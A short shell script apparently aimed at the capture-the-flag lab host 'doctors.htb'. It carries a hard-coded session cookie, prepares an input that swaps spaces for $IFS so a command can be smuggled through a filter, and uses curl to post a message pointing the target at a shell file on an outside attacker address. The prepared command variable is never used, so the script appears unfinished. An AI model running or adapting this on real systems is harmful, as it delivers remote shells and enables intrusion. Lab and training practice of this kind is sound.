#!/bin/sh

AUTH=".eJwlzjtuAzEMRdG9qHZBkaIkejMD_oQEBhJgxq4M7z0CUr77mvMuxzrz-ir35_nKWzm-o9wLMbcclUKpWRvMVjmHo6qgTKY5x0hvSiliih5ZU-q-bCBDVTcFWLFM-2yE0bqvSrXLlHTrTKSqK3HpJOidJMGtdaXqkA5cNuR15fmvwT39Otfx_H3kzw4GQKKrxXRN5zEp2hYMDk1EmOoSUdHL5w_mtkAe.X4VVjA.BoE9pdlxkkZrzo9CLdomCzk-UKU"

CMD=$(echo "${1}" | sed 's/ /$IFS/g')

curl -v 'http://doctors.htb/post/new' \
  -H "Cookie: session=${AUTH}" \
  --data "title=t&content=http://10.10.14.32:22473/tools/short-shell.php&submit=Post"